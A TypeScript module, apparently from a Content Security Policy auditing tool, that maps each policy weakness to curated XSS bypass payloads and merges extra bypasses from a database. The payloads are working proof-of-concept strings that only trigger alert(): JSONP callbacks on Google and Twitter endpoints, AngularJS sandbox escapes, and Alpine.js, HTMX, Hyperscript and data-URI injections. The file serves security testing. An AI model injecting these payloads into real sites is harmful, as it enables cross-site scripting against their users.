import type { BypassRecord, CuratedBypass } from "shared";

const CURATED_BYPASSES: Record<string, CuratedBypass[]> = {
  "script-wildcard": [
    {
      id: "googleapis-jsonp",
      name: "Google APIs JSONP Callback",
      technique: "JSONP",
      payload:
        '<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>',
      description: "Uses Google Maps API JSONP callback to execute JavaScript",
      difficulty: "easy",
      domain: "maps.googleapis.com",
      source: "cspbypass",
    },
    {
      id: "google-translate-jsonp",
      name: "Google Translate JSONP",
      technique: "JSONP",
      payload:
        '<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>',
      description: "Exploits Google Translate API JSONP endpoint",
      difficulty: "easy",
      domain: "translate.google.com",
      source: "cspbypass",
    },
    {
      id: "gstatic-angular",
      name: "Google Static AngularJS",
      technique: "AngularJS",
      payload:
        "<img src=x ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">",
      description: "AngularJS expression injection via Google Static CDN",
      difficulty: "medium",
      domain: "ssl.gstatic.com",
      source: "cspbypass",
      requirements: ["AngularJS on page"],
    },
    {
      id: "jsdelivr-alpine",
      name: "jsDelivr Alpine.js XSS",
      technique: "Alpine.js",
      payload: '<div x-init="alert(1)"></div>',
      description: "Alpine.js directive injection via jsDelivr CDN",
      difficulty: "easy",
      domain: "cdn.jsdelivr.net",
      source: "cspbypass",
      requirements: ["Alpine.js library loaded"],
    },
  ],
  "script-unsafe-inline": [
    {
      id: "angular-ng-onerror",
      name: "AngularJS ng-on-error",
      technique: "AngularJS",
      payload: '<img src=x ng-on-error="window.alert(window.origin)">',
      description: "AngularJS directive event handler injection",
      difficulty: "easy",
      source: "cspbypass",
      requirements: ["AngularJS on page"],
    },
    {
      id: "htmx-trigger",
      name: "HTMX Trigger XSS",
      technique: "HTMX",
      payload: '<any hx-trigger="x[1)}),alert(origin)//]">',
      description: "HTMX trigger attribute injection",
      difficulty: "medium",
      domain: "cdn.jsdelivr.net",
      source: "cspbypass",
      requirements: ["HTMX library loaded"],
    },
    {
      id: "hyperscript-xss",
      name: "Hyperscript XSS",
      technique: "Hyperscript",
      payload: '<x _="on load alert(1)">',
      description: "Hyperscript directive injection",
      difficulty: "easy",
      domain: "unpkg.com",
      source: "cspbypass",
      requirements: ["Hyperscript library loaded"],
    },
  ],
  "script-unsafe-eval": [
    {
      id: "eval-injection",
      name: "Direct Eval",
      technique: "Dynamic Code",
      payload: 'eval("alert(document.domain)")',
      description: "Direct eval() function exploitation",
      difficulty: "easy",
      source: "generic",
    },
    {
      id: "function-constructor",
      name: "Function Constructor",
      technique: "Dynamic Code",
      payload: 'new Function("alert", "alert(document.domain)")(alert)',
      description: "Function constructor code execution",
      difficulty: "medium",
      source: "generic",
    },
  ],
  "jsonp-bypass-risk": [
    {
      id: "google-search-suggest",
      name: "Google Search Suggestions",
      technique: "JSONP",
      payload:
        '<script src="https://suggestqueries.google.com/complete/search?callback=alert&client=chrome"></script>',
      description: "Google search suggestions JSONP callback exploitation",
      difficulty: "easy",
      domain: "suggestqueries.google.com",
      source: "cspbypass",
    },
    {
      id: "twitter-api-jsonp",
      name: "Twitter API JSONP",
      technique: "JSONP",
      payload:
        '<script src="https://api.twitter.com/1.1/users/show.json?callback=alert"></script>',
      description: "Twitter API JSONP endpoint exploitation",
      difficulty: "easy",
      domain: "api.twitter.com",
      source: "cspbypass",
    },
  ],
  "angularjs-bypass": [
    {
      id: "angular-constructor-bypass",
      name: "AngularJS Constructor Bypass",
      technique: "AngularJS",
      payload: '{{constructor.constructor("alert(document.domain)")()}}',
      description: "AngularJS sandbox escape via constructor chain",
      difficulty: "hard",
      source: "cspbypass",
      requirements: ["AngularJS 1.x", "Template injection point"],
    },
    {
      id: "angular-orderby-bypass",
      name: "AngularJS OrderBy Filter Bypass",
      technique: "AngularJS",
      payload: "{{ [].constructor.from([1],alert) }}",
      description: "AngularJS filter exploitation for code execution",
      difficulty: "hard",
      source: "cspbypass",
      requirements: ["AngularJS 1.x", "Filter injection point"],
    },
  ],
  "script-data-uri": [
    {
      id: "data-script-basic",
      name: "Data URI Script",
      technique: "Data URI",
      payload:
        '<script src="data:text/javascript,alert(document.domain)"></script>',
      description: "Execute JavaScript via data URI scheme",
      difficulty: "easy",
      source: "generic",
    },
  ],
  "object-wildcard": [
    {
      id: "object-data-html",
      name: "Object Data HTML",
      technique: "Object Embed",
      payload:
        '<object data="data:text/html,<script>alert(document.domain)</script>"></object>',
      description: "Embed executable HTML content via object tag",
      difficulty: "medium",
      source: "generic",
    },
  ],
  "style-unsafe-inline": [
    {
      id: "css-import-js",
      name: "CSS Import JavaScript",
      technique: "CSS Injection",
      payload: '<style>@import "javascript:alert(document.domain)";</style>',
      description: "CSS import statement JavaScript execution",
      difficulty: "medium",
      source: "generic",
      requirements: ["Older browsers"],
    },
  ],
};

export function getBypassesForCheck(
  checkId: string,
  dbRecords?: BypassRecord[],
): CuratedBypass[] {
  const curated = CURATED_BYPASSES[checkId] ?? [];

  if (dbRecords === undefined || dbRecords.length === 0) return curated;

  const existingPayloads = new Set(curated.map((b) => b.payload));
  const relevantDb = filterDbRecordsByCheck(checkId, dbRecords);

  const combined = [...curated];
  for (const record of relevantDb) {
    if (!existingPayloads.has(record.code)) {
      combined.push({
        id: `db-${record.id}`,
        name: `${record.domain} ${record.technique}`,
        technique: record.technique,
        payload: record.code,
        description: `${record.technique} bypass using ${record.domain}`,
        difficulty: "medium",
        domain: record.domain,
        source: "cspbypass",
      });
      existingPayloads.add(record.code);
    }
  }

  return combined.slice(0, 10);
}

function filterDbRecordsByCheck(
  checkId: string,
  records: BypassRecord[],
): BypassRecord[] {
  const techniqueMap: Record<string, string[]> = {
    "script-wildcard": [
      "AngularJS",
      "Script Injection",
      "Event Handler",
      "Alpine.js",
      "HTMX",
    ],
    "script-unsafe-inline": [
      "AngularJS",
      "Script Injection",
      "Event Handler",
      "Alpine.js",
      "HTMX",
    ],
    "jsonp-bypass-risk": ["JSONP"],
    "angularjs-bypass": ["AngularJS"],
    "script-unsafe-eval": ["Script Injection"],
    "script-data-uri": ["Script Injection"],
    "object-wildcard": ["Iframe Injection"],
    "style-unsafe-inline": ["Link Preload"],
  };

  const relevantTechniques = techniqueMap[checkId];
  if (relevantTechniques === undefined) return [];

  return records
    .filter((r) => relevantTechniques.includes(r.technique))
    .slice(0, 20);
}
